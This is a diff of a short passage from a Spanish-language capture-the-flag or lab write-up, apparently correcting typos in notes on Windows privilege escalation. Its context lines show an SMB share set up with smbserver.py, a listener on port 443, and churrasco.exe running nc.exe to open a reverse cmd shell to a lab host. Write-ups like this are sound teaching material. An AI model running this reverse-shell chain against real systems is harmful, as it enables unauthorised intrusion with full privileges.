@@ -105,7 +105,7 @@ Primero nos comaptiremos el recurso a nivel de red
 smbserver.py smbFolder $(pwd)
 ```
 
-Nos pondremos en escucha en el puesrto seleccionado
+Nos pondremos en escucha en el puerto seleccionado
 ```shell
 penelope -p 443
 ```
@@ -115,6 +115,6 @@ Y ejecutaremos [[CHURRASCO]]
 churrasco.exe "\\10.10.14.226\smbFolder\nc.exe -e cmd 10.10.14.226 443" 
 ```
 
-Obteneindo asi una shell con los maximos privilegios y consigfuiendo las flags de los usuarios
+Obteniendo así una shell con los máximos privilegios y consiguiendo las flas de los usuarios
 
 
